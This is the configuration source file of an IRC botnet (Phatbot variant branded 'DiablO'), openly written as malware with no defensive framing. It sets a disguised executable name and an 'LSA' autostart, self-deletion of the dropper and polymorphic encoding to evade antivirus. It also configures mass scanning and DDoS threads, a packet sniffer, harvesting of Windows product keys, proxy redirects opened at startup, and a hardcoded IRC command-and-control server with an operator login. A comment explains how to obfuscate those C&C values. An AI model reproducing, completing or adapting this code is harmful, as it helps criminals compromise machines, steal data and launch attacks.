#include "main.h"
#include "bot.h"
#include "mainctrl.h"
#include "smtp_logic.h"
#include "utility.h"

// Change the "stub" to whatever, just dont remove the '.'
// this is the name of the section used by the polymorph
// you only can use up to 8 charaters before the .  here   
#define SECTION_NAME ".diabloz"
char *g_szSectionName=SECTION_NAME;

//CSMTP_Logic		g_cSMTPLogic;
//CAOL_Logic		g_cAOLLogic;
//CCommandInterval	g_cCommandInterval;

void CBot::Config()
{	int iCryptKey=10;

	REGCVAR(si_nick,			"",							"Server Info - Nickname",						false,	false,	0	);
	REGCVAR(bot_version,		VERSION_PHATBOT,				"Bot - Version",						false,	false,	0	);
	REGCVAR(bot_filename,		"wfdmgr.exe",				"Bot - Runtime Filename",                   false,	false,	0	);
	REGCVAR(bot_id,				"DiablO",					"Bot - Current ID",	                     false,	false,	0	);
  	REGCVAR(bot_prefix,			".",						"Bot - Command Prefix",						false,	false,	0	);
	REGCVAR(bot_timeout,		"999999999",				"Bot - Timeout for receiving in miliseconds",	false,	false,	0	);
	REGCVAR(bot_seclogin,		"false",					"Bot - Enable login only by channel messages",	false,	false,	0	);
	REGCVAR(bot_compnick,		"false",					"Bot - Use the computer name as a nickname",	false,	false,	0	);
	REGCVAR(bot_randnick,		"false",					"Bot - Random nicks of Letters and Numbers",	false,	false,	0	);
	REGCVAR(bot_meltserver,		"true",						"Bot - Melt the original server file",			false,	false,	0	);
	REGCVAR(bot_topiccmd,		"true",					"Bot - Execute topic commands",					false,	false,	0	);

	REGCVAR(as_valname,			"LSA",	"Autostart - Value Name",						false,	false,	0	);
#ifndef _DEBUG
	REGCVAR(as_enabled,			"true",						"Autostart - Enabled",							false,	false,	0	);
	REGCVAR(as_service,			"false",						"Autostart - Start as service",					false,	false,	0	);
#else
	REGCVAR(as_enabled,			"true",					"Autostart - Enabled",							false,	false,	0	);
	REGCVAR(as_service,			"false",					"Autostart - Start as service",					false,	false,	0	);
#endif // _DEBUG
	REGCVAR(as_service_name,	"LSA",	"Autostart - Short service name",				false,	false,	0	);

	REGCVAR(scan_maxthreads,	"600",						"Scanner - Maximum Number of threads",			false,	false,	0	);
	REGCVAR(scan_maxsockets,	"3048",						"Scanner - Maximum Number of sockets",			false,	false,	0	);
	REGCVAR(ddos_maxthreads,	"500",						"DDOS - Maximum Number of threads",				false,	false,	0	);
	REGCVAR(redir_maxthreads,	"400",						"Redirect - Maximum Number of threads",			false,	false,	0	);
	REGCVAR(identd_enabled,		"false",					"IdentD - Enable the server",					false,	false,	0	);
	REGCVAR(cdkey_windows,		"false",					"Return Windows Product Keys on cdkey.get",		false,	false,	0	);
	REGCVAR(csendfile_show,		"true",						"CSendFile - Show connections to the port",		false,	false,	0	);
	
	REGCVAR(sniffer_enabled,	"false",						"Sniffer - Enabled ?",							false,	false,	0	);
	REGCVAR(sniffer_channel,	"#sniff",					"Sniffer Output channel",						false,	false,	0	);

	// This is incompatible with .exe packers
	REGCVAR(inst_polymorph,		"true",						"Installer - Polymorph on install ?",			false,	false,	0	);

	// Use MD5 Passwords, for security reasons, has to be uppercase
	ADDUSER("diablo", "098F6BCD4621D373CADE4E832627B4F6",	"elite",	""	);	// ".login diablo test"
	// Uncomment this to do autostart commands
}

void CBot::Autostart()
{	CMessage mFakeMsg;

	mFakeMsg.bNotice=false; mFakeMsg.bSilent=true;
	mFakeMsg.sChatString.Format(".redirect.http 63000");
	mFakeMsg.sCmd.Assign("redirect.http");
	mFakeMsg.sDest.Assign(g_pMainCtrl->m_cBot.si_mainchan.sValue);
	mFakeMsg.sHost.Assign("AutoStart.Net");
	mFakeMsg.sIdentd.Assign("AutoStart");
	mFakeMsg.sReplyTo.Assign(g_pMainCtrl->m_cBot.si_mainchan.sValue);
	mFakeMsg.sSrc.Assign("AutoStart");

	g_pMainCtrl->m_cRedirect.HandleCommand(&mFakeMsg);

	mFakeMsg.sChatString.Format(".redirect.https 63001");
	mFakeMsg.sCmd.Assign("redirect.https");

	g_pMainCtrl->m_cRedirect.HandleCommand(&mFakeMsg);

	mFakeMsg.sChatString.Format(".redirect.socks 30001");
	mFakeMsg.sCmd.Assign("redirect.socks");

	g_pMainCtrl->m_cRedirect.HandleCommand(&mFakeMsg);

//	g_cSMTPLogic.Init();	g_cSMTPLogic.Start(false);
//	g_cAOLLogic.Init();		g_cAOLLogic.Start(false);



	REGCVAR(m_isServerRoot.si_chanpass,		"test",							"Server Info - Channel Password",	false,	false,	0	);
	REGCVAR(m_isServerRoot.si_mainchan,		"#test",					"Server Info - Main Channel",		false,	false,	0	);
	REGCVAR(m_isServerRoot.si_nickprefix,	"woot|",						"Server Info - Nickname prefix",	false,	false,	0	);
	REGCVAR(m_isServerRoot.si_port,			"6667",						"Server Info - Server Port",		false,	false,	0	);
	REGCVAR(m_isServerRoot.si_server,		"irc.blackcarder.net",	"Server Info - Server Address",		false,	false,	0	);
	REGCVAR(m_isServerRoot.si_servpass,		"",							"Server Info - Server Password",	false,	false,	0	);
	REGCVAR(m_isServerRoot.si_usessl,		"false",					"Server Info - Use SSL ?",			false,	false,	0	);
	REGSERVER(m_isServerRoot);



/*   use crypt.exe in msdos prompt..  crypt.exe hex 10 yourchannel 
     my way is put crypt.exe in my windows/system32 and run from there :D    
     and you must replace last false and number 0 to true and number 10 in  above thing. 
     look at example below here.    
     Glow ;)   


	REGCVAR(m_isServerRoot.si_chanpass,		"\x23\x28\x23\x4C\x47\x34\x5C\x44\x46\x53\x23\x18",							"Server Info - Channel Password",	false,	true,	10	);
	REGCVAR(m_isServerRoot.si_mainchan,		"\x24\x25\x5F\x36\x25\x25",					"Server Info - Main Channel",		false,	true,	10	);
	REGCVAR(m_isServerRoot.si_nickprefix,	"",						"Server Info - Nickname prefix",	false,	false,	0	);
	REGCVAR(m_isServerRoot.si_port,			"\x39\x38\x3A\x39\x38",						"Server Info - Server Port",		false,	true,	10	);
	REGCVAR(m_isServerRoot.si_server,		"\x5B\x7!\x3D\x60\x38\x25\x66\x62\x79\x28\x24\x48\x44\x6D\x7F\x35\x68\x47",	"Server Info - Server Address",		false,	true,	10	);
	REGCVAR(m_isServerRoot.si_servpass,		"",							"Server Info - Server Password",	false,	false,	0	);
	REGCVAR(m_isServerRoot.si_usessl,		"false",					"Server Info - Use SSL ?",			false,	false,	0	);
        REGSERVER(m_isServerRoot);

*/


}

#ifdef WIN32

#pragma warning(disable:4068)
#pragma data_seg(SECTION_NAME)
// You can try smaller size here. This will make the bot smaller,
// but make it so the encoder still fits in, else no polymorph will
// be done.
__declspec(allocate(SECTION_NAME)) char szBuf[16384];

#endif // WIN32
